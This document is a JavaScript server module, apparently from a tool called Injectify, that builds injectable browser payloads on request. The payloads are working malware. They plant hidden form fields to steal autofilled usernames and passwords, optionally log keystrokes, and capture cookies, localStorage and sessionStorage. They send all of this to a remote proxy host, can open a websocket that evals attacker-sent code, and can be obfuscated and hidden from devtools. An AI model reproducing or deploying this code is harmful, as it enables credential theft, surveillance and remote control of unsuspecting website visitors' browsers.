const chalk = require('chalk')
const ObfuscateJS = require('js-obfuscator')
const beautify = require('js-beautify').js_beautify

module.exports = (req, res) => {
  function enc (string, enableEval) {
    if (req.query.base64 === 'false') {
      if (enableEval) {
        return string
      } else {
        return '"' + string + '"'
      }
    } else {
      if (enableEval) {
        return 'eval(atob("' + btoa(string) + '"))'
      } else {
        return 'atob("' + btoa(string) + '")'
      }
    }
  }
  function comment (message) {
    if (req.query.comments === 'true') {
      return '\n// ' + message
    } else {
      return ''
    }
  }
  function ifPassword (script) {
    if (req.query.passwords === 'false') {
      return ''
    } else {
      return script + '\n'
    }
  }
  function ifNotPassword (script) {
    if (req.query.passwords === 'false') {
      return script + '\n'
    } else {
      return ''
    }
  }
  function debug (script) {
    if (req.query.debug === 'true') {
      return '\n' + script
    } else {
      return ''
    }
  }
  function sendToServer (url) {
    if (config.dev) url = '"http:"+' + url
    if (bypassCors) {
      return 'window.location=' + url + '+"$"'
    } else {
      return enc('c.src=' + url, true)
    }
  }
  let valid = true
  if (!req.query.project) valid = false

  let inject = false
  if (req.query.inject === 'true') inject = true
  let keylogger = false
  if (req.query.keylogger === 'true') keylogger = true
  let screenSize = true
  if (req.query.screenSize === 'false') screenSize = false
  let location = true
  if (req.query.location === 'false') location = false
  let localStorage = true
  if (req.query.localStorage === 'false') localStorage = false
  let sessionStorage = true
  if (req.query.sessionStorage === 'false') sessionStorage = false
  let cookies = true
  if (req.query.cookies === 'false') cookies = false
  let bypassCors = false
  if (req.query.bypassCors === 'true') bypassCors = true

  let proxy = '//uder.ml/' // '//injectify.samdd.me/'
  if (req.query.proxy) proxy = req.query.proxy
  let wss = 'wss:'
  if (config.dev) {
    proxy = '//localhost:' + config.express + '/'
    wss = 'ws:'
  }

  let injectProject = btoa(req.query.project)
  if (req.query.debug === 'true') injectProject = '$' + injectProject
  let help = `
  // ┌─────────────────────────────────────┐
  // │     Injectify payload engine ©      │
  // │   INTELLECTUAL PROPERTY OF SAMDD    │
  // ├────────────────┬─────────┬──────────┤
  // │ GET_PARAM      │ TYPE    │ DEFAULT  │
  // ├────────────────┼─────────┼──────────┤
  // │ project        │ STRING  │ REQUIRED │
  // │ proxy          │ URL     │ NONE     │
  // │ base64         │ BOOLEAN │ TRUE     │
  // │ obfuscate      │ BOOLEAN │ FALSE    │
  // │ minify         │ BOOLEAN │ FALSE    │
  // │ comments       │ BOOLEAN │ FALSE    │
  // | debug          | BOOLEAN | FALSE    |
  // | bypassCors     | BOOLEAN | FALSE    |
  // │                │         │          │
  // | inject         │ BOOLEAN │ FALSE    |
  // | passwords      │ BOOLEAN │ TRUE     |
  // | keylogger      │ BOOLEAN │ FALSE    |
  // │ screenSize     │ BOOLEAN │ TRUE     │
  // │ location       │ BOOLEAN │ TRUE     │
  // │ localStorage   │ BOOLEAN │ TRUE     │
  // │ sessionStorage │ BOOLEAN │ TRUE     │
  // │ cookies        │ BOOLEAN │ TRUE     │
  // └────────────────┴─────────┴──────────┘`

  if (valid) {
    res.setHeader('Content-Type', 'application/javascript')

    let variables = ''
    let json = ''
    let body = ''
    let catcher = ''
    let injectScript

    if (inject) {
      let websocket = "'"+ wss + "'+p+'i/websocket?" + injectProject + "'"
      if (req.query.passwords === 'false' && keylogger === false) websocket = "'" + wss + proxy + "i/websocket?" + injectProject + "'"
      body += `
        function u() {` + comment('Open a new websocket to the server') + `
          window.ws = new WebSocket(` + websocket + `)
          ws.onmessage = function(d) {
              try {` + comment('Parse the websocket message as JSON') + `
                  d = JSON.parse(d.data)` + comment('Evaluate the javascript') + `
                  eval(d.d)
              } catch(e) {` + comment('On error send error back to server') + `
                  ws.send(JSON.stringify({
                      t: 'e',
                      d: e.stack,
                  }))
              }
          }
          ws.onclose = function() {` + comment('Attempt to re-open the websocket, retrying every 3 seconds') + `
              setTimeout(u, 3000)
          }
        }
        u()
      `
      injectScript = body
    }
    if (keylogger) {
      variables += 'm = {}, f = [], g = new Date().getTime(),'
      body += comment('add listeners to the window for keydown & keyup events') + `
        k.onkeydown = k.onkeyup = function (n) {
          var l = '',` + comment('give the keycode number to variables h & z') + `
            h = n.key,
            z = h` + comment("if the key type ends with p => then it's keyup") + `
          if (n.type.slice(-1) == 'p') l = '_'` + comment('append the keyup / keydown indicator') + `
          z += l` + comment('ignore multiple modifier calls & invalid key presses') + `
          if (m == z || !h) return` + comment('Push to array') + `
          f.push(z)` + comment('update the value of the last m(odifier) key press') + `
          if (h.length > 1) m = z
          ` + debug(`
            if (n.key && n.key.length > 1) {
              console.log('%c[keylogger@INJECTIFY] %cModifier key state changed', 'color: #ef5350; font-weight: bold', 'color: #FF9800', n)
            } else {
              console.log('%c[keylogger@INJECTIFY] %cKey state changed', 'color: #ef5350; font-weight: bold', 'color: #FF9800', n)
            }
          `) + `
        }

        setInterval(function() {` + comment('if the array is empty, skip making a request') + `
          if (!f.length) return
          i = {
            a: atob("` + btoa(req.query.project) + `"),
            t: 1,
            b: g,
            c: f,
            d: k.location.href,
            j: d.title
          }
          ` + sendToServer("p+'r/'+btoa(encodeURI(JSON.stringify(i))).split('').reverse().join('')") + `
          f = []
        }, 3000)
      `
    }
    if (screenSize) {
      variables += 'j = k.screen,'
      json += 'e: j.height, f: j.width,'
    }
    if (location) json += 'd: k.location.href, j: d.title,'
    if (localStorage) catcher += 'i.g = localStorage,'
    if (sessionStorage) catcher += 'i.h = sessionStorage,'
    if (cookies) json += 'i: d.cookie,'

    if (variables) variables = ',' + variables.slice(0, -1)
    if (json) json = ',' + json.slice(0, -1)
    if (catcher) {
      if (req.query.debug === 'true') {
        catcher = '\n' + catcher.slice(0, -1)
      } else {
        catcher = '\ntry {' + comment('attempt to insert the local & session storage into object, but ignore if it fails\n') + catcher.slice(0, -1) + '} catch(error) {}\n\n'
      }
    }

    let script = help + `
    //  Project name    | ` + req.query.project + `


    ` + injectScript
    if (!(req.query.passwords == 'false' && keylogger == false)) {
      script = help + `
      //  Project name    | ` + req.query.project + `


      var d = document,` +
        ifPassword(`
          v = ` + enc('input') + `,
          w = d.createElement(` + enc('form') + `),
          x = d.createElement(v),
          y,`
        ) +
        `c = ` + enc('new Image()', true) + `,
        p = ` + enc(proxy) + `,
        i,
        k = window` + variables +

      ifPassword(`\n` +
        comment('name attribute is required for autofill to work') + `
        x.name = ""` +

        comment('autofill still works if the elements are non-rendered') + `
        x.style = ` + enc('display:none') + `
        ` +

        comment('clone the input node instead of declaring it again') + `
        y = x.cloneNode()` +

        comment('set the input type to password') + `
        y.type = ` + enc('password') + `
        ` +

        comment('append elements to form node') + `
        w.appendChild(x)
        w.appendChild(y)` +

        comment('append form node to DOM') + `
        d.body.appendChild(w)`
      ) + '\n' +

      body +

      ifPassword(
        comment("add a listener to the password input, browser's autofiller will trigger this") + `
        y.addEventListener(v, function () {` + comment('construct a global object with data to extract')
      ) + ifNotPassword(`\n`) +
        `i = {
          a: atob("` + btoa(req.query.project) + `"),
          t: 0` +
          ifPassword(`,
            b: x.value,
            c: y.value`
          ) + json + `
        }
        ` + catcher +
        ifPassword(debug("console.log('%c[INJECTIFY] %cCaptured username & password', 'color: #ef5350; font-weight: bold', 'color: #FF9800', i)\n")) +

        comment('send a request to the server (or proxy) with the BASE64 encoded JSON object\n') +
        sendToServer(`p+'r/'+btoa(encodeURI(JSON.stringify(i))).split('').reverse().join('')`) +
        ifPassword(
          comment("remove the form node from the DOM (so it can't be (easily) seen in devtools)") + `
          w.remove()
          })`
        )
      /// ////////////////////////////////////////////////////////////////////////
    }

    if (req.query.obfuscate === 'true') {
      ObfuscateJS(script).then(obfuscated => {
        res.send(obfuscated)
      }, function (err) {
        res.send(UglifyJS.minify(script).code)
        throw err
      })
    } else if (req.query.minify === 'true') {
      res.send(
        UglifyJS.minify(script).code
      )
    } else {
      res.send(
        beautify(script, {
          indent_size: 2
        })
      )
    }
  } else {
    res.setHeader('Content-Type', 'application/javascript')
    let script = help
    res.status(400).send(
      beautify(script, {
        indent_size: 2
      })
    )
  }
  if (config.debug) {
    console.log(
    chalk.greenBright('[Payload] ') +
    chalk.yellowBright('generated for project ') +
    chalk.magentaBright(req.query.project)
  )
  }
}